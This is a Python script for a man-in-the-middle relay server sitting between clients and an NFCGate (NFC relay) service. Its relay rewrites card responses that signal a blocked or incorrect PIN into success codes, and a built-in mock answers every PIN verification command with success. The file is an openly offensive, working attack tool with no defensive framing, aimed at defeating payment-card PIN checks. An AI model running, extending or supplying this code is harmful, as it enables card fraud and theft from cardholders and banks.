#!/usr/bin/env python3
"""
Simple NFCGate MITM Server - Fixed Version
No emojis, simpler interface, addresses connection issues
"""

import socket
import threading
import time
import logging
import uuid
import json
from datetime import datetime
from typing import Dict, List, Optional
import signal
import sys

# Configure logging without emojis
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('nfcgate_mitm_fixed.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SimpleNFCGateMITM:
    def __init__(self):
        # Load config or use defaults
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
        except:
            config = {}
        
        self.listen_port = config.get("server", {}).get("listen_port", 8080)
        self.target_host = config.get("server", {}).get("target_host", "127.0.0.1")
        self.target_port = config.get("server", {}).get("target_port", 5566)
        
        self.server_socket = None
        self.mock_socket = None
        self.running = False
        self.mock_running = False
        self.sessions = {}
        self.stats = {
            'total_connections': 0,
            'successful_sessions': 0,
            'failed_connections': 0,
            'pins_bypassed': 0
        }

    def start_mock_service(self):
        """Start simple mock NFCGate service"""
        def mock_server():
            try:
                self.mock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.mock_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.mock_socket.bind((self.target_host, self.target_port))
                self.mock_socket.listen(10)
                self.mock_running = True
                
                logger.info(f"Mock NFCGate started on {self.target_host}:{self.target_port}")
                
                while self.running:
                    try:
                        self.mock_socket.settimeout(1.0)
                        client_socket, addr = self.mock_socket.accept()
                        logger.info(f"Mock: Connection from {addr}")
                        
                        # Handle in thread
                        threading.Thread(
                            target=self.handle_mock_client,
                            args=(client_socket, addr),
                            daemon=True
                        ).start()
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        if self.running:
                            logger.error(f"Mock server error: {e}")
                        break
                        
            except Exception as e:
                logger.error(f"Failed to start mock service: {e}")
            finally:
                self.mock_running = False
                if self.mock_socket:
                    try:
                        self.mock_socket.close()
                    except:
                        pass
        
        threading.Thread(target=mock_server, daemon=True).start()
        time.sleep(0.5)  # Let it start

    def handle_mock_client(self, client_socket, addr):
        """Handle mock NFCGate client connections"""
        try:
            client_socket.settimeout(30)
            while self.running:
                try:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    
                    # Simple response logic
                    response = self.create_response(data)
                    client_socket.send(response)
                    
                    # Check for PIN commands
                    if len(data) >= 2 and data[0] == 0x00 and data[1] == 0x20:
                        logger.info(f"PIN bypass applied for {addr}")
                        self.stats['pins_bypassed'] += 1
                    
                except socket.timeout:
                    break
                except Exception as e:
                    logger.debug(f"Mock client error: {e}")
                    break
                    
        except Exception as e:
            logger.warning(f"Mock handler error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def create_response(self, data):
        """Create appropriate responses"""
        try:
            if len(data) >= 2:
                # PIN verification command
                if data[0] == 0x00 and data[1] == 0x20:
                    return b'\x90\x00'  # Success
                # SELECT command
                elif data[0] == 0x00 and data[1] == 0xA4:
                    return b'\x6F\x1E\x84\x07\xA0\x00\x00\x00\x04\x10\x10\x90\x00'
                # GET PROCESSING OPTIONS
                elif data[0] == 0x80 and data[1] == 0xA8:
                    return b'\x77\x0E\x82\x02\x19\x80\x94\x08\x08\x01\x01\x00\x90\x00'
            
            # Default success
            return b'\x90\x00'
            
        except:
            return b'\x90\x00'

    def start_server(self):
        """Start the MITM server"""
        try:
            # Start mock service first
            logger.info("Starting mock NFCGate service...")
            self.start_mock_service()
            
            # Check if mock is ready
            for i in range(10):
                if self.mock_running:
                    logger.info("Mock service ready")
                    break
                time.sleep(0.5)
            
            # Start MITM server
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.listen_port))
            self.server_socket.listen(10)
            self.running = True
            
            logger.info(f"MITM Server started on port {self.listen_port}")
            logger.info(f"Targeting NFCGate at {self.target_host}:{self.target_port}")
            logger.info("PIN bypass features enabled")
            
            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()
                    self.stats['total_connections'] += 1
                    
                    session_id = str(uuid.uuid4())[:8]
                    logger.info(f"New connection from {client_addr} (Session: {session_id})")
                    
                    # Handle in thread
                    threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_addr, session_id),
                        daemon=True
                    ).start()
                    
                except socket.error as e:
                    if self.running:
                        logger.error(f"Server error: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
        finally:
            self.stop_server()

    def handle_client(self, client_socket, client_addr, session_id):
        """Handle individual client connections"""
        session_start = time.time()
        nfcgate_socket = None
        
        self.sessions[session_id] = {
            'client_addr': client_addr,
            'start_time': session_start,
            'status': 'connecting'
        }
        
        try:
            # Connect to NFCGate with retries
            for attempt in range(5):
                try:
                    nfcgate_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    nfcgate_socket.settimeout(10)
                    nfcgate_socket.connect((self.target_host, self.target_port))
                    logger.info(f"Connected to NFCGate for session {session_id}")
                    break
                except Exception as e:
                    if nfcgate_socket:
                        try:
                            nfcgate_socket.close()
                        except:
                            pass
                        nfcgate_socket = None
                    
                    if attempt < 4:
                        logger.warning(f"Connection attempt {attempt + 1} failed, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            
            if not nfcgate_socket:
                raise ConnectionError("Failed to connect to NFCGate")
            
            self.sessions[session_id]['status'] = 'active'
            
            # Start data relay
            client_to_nfc = threading.Thread(
                target=self.relay_data,
                args=(client_socket, nfcgate_socket, "CLIENT->NFCGate", session_id),
                daemon=True
            )
            
            nfc_to_client = threading.Thread(
                target=self.relay_data,
                args=(nfcgate_socket, client_socket, "NFCGate->CLIENT", session_id),
                daemon=True
            )
            
            client_to_nfc.start()
            nfc_to_client.start()
            
            # Wait for relay to finish
            while client_to_nfc.is_alive() and nfc_to_client.is_alive():
                time.sleep(0.1)
            
            self.stats['successful_sessions'] += 1
            
        except Exception as e:
            logger.error(f"Session {session_id} error: {e}")
            self.stats['failed_connections'] += 1
            
        finally:
            # Cleanup
            for sock in [client_socket, nfcgate_socket]:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            
            duration = time.time() - session_start
            if session_id in self.sessions:
                self.sessions[session_id]['status'] = 'ended'
                self.sessions[session_id]['duration'] = duration
            
            logger.info(f"Session {session_id} ended after {duration:.2f}s")

    def relay_data(self, source, dest, direction, session_id):
        """Relay data between sockets"""
        try:
            while self.running:
                try:
                    data = source.recv(4096)
                    if not data:
                        break
                    
                    # Apply PIN bypass
                    if "NFCGate->CLIENT" in direction:
                        data = self.apply_pin_bypass(data)
                    
                    dest.send(data)
                    
                except Exception as e:
                    logger.debug(f"Relay error {direction}: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Relay thread error: {e}")

    def apply_pin_bypass(self, data):
        """Apply PIN bypass modifications"""
        try:
            # Convert PIN blocked/incorrect to success
            if len(data) >= 2:
                if data[-2:] in [b'\x69\x83', b'\x63\xC0']:  # PIN blocked or incorrect
                    logger.debug("PIN bypass applied")
                    return data[:-2] + b'\x90\x00'
            return data
        except:
            return data

    def stop_server(self):
        """Stop the server"""
        logger.info("Stopping MITM server...")
        self.running = False
        self.mock_running = False
        
        for sock in [self.server_socket, self.mock_socket]:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        logger.info("Server stopped")

    def get_stats(self):
        """Get statistics"""
        return {
            **self.stats,
            'active_sessions': len([s for s in self.sessions.values() if s.get('status') == 'active']),
            'total_sessions': len(self.sessions)
        }

def run_server():
    """Run the server without menu"""
    mitm = SimpleNFCGateMITM()
    
    def signal_handler(signum, frame):
        logger.info("Shutdown signal received")
        mitm.stop_server()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        logger.info("Starting Simple NFCGate MITM Server...")
        logger.info("Press Ctrl+C to stop")
        mitm.start_server()
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    finally:
        mitm.stop_server()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "stats":
        # Just show stats
        mitm = SimpleNFCGateMITM()
        stats = mitm.get_stats()
        print("Statistics:")
        for key, value in stats.items():
            print(f"  {key}: {value}")
    else:
        # Run server
        run_server()
